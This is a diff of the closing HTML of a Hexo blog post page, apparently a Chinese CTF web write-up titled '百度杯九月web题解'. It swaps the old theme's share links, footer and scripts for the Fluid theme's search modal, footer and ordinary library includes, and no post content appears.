-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&is_video=false&description=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=百度杯九月web题解&body=Check out this article: http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&name=百度杯九月web题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&t=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "百度杯九月web题解&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
